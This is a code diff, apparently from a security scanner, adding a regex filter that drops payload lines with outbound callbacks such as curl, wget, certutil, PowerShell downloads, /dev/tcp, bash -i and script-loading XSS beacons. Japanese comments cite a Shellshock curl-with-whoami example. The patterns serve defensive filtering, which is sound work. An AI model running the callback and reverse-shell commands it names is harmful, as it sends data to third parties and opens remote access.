@@ -64,6 +64,25 @@ _DESTRUCTIVE_RE_LIST = [
     )
 ]
 
+# 外部コールバック/データ持ち出し（exfiltration）系。スキャン対象から第三者の
+# 固定エンドポイントへ情報を送り出す（= 検出プローブではなく実害）ため、既定で除外する。
+# 例: Shellshock の `() { :;}; curl http://<外部IP>/...?user=`whoami``、
+#     reverse shell (`bash -i`, `/dev/tcp/...`)、外部 script を動的読込する XSS ビーコン。
+# ※ローカル読取の検出プローブ（`../../etc/shadow` 等）は持ち出しではないので除外しない。
+_EXFILTRATION_RE_LIST = [
+    re.compile(pattern, re.IGNORECASE)
+    for pattern in (
+        # Shellshock の持ち出しは外部 curl/wget を伴うので下の通信クライアント規則で捕捉する
+        # （`() {` 自体は fork 爆弾 `:(){ … };:` 等の破壊系とも衝突するため、ここでは使わない）。
+        r"curl|wget",  # 外向き通信クライアント（端末エスケープ等で難読化されても拾えるよう部分一致）
+        r"\b(?:nslookup|dig|telnet|lwp-download|certutil)\b",
+        r"Invoke-WebRequest|Net\.WebClient|DownloadString",  # PowerShell 外部取得
+        r"/dev/tcp/",  # bash reverse shell / 外部送出
+        r"\bbash\s+-i\b",  # 対話的 reverse shell
+        r"createElement\(['\"]script['\"]\)[^\n]{0,60}\.src",  # 外部 script を動的読込する XSS ビーコン
+    )
+]
+
 
 def parse_payload_lines(
     text: str,
@@ -85,6 +104,10 @@ def parse_payload_lines(
         if _MARKDOWN_HEADING_RE.match(line):
             continue
         if not allow_destructive and any(rx.search(line) for rx in _DESTRUCTIVE_RE_LIST):
+            continue
+        # 外部コールバック/持ち出しは allow_destructive でも常に除外（送信先が
+        # 運用者の管理外＝第三者であり、認可テストでも適切でないため）。
+        if any(rx.search(line) for rx in _EXFILTRATION_RE_LIST):
             continue
         if line in seen:
             continue
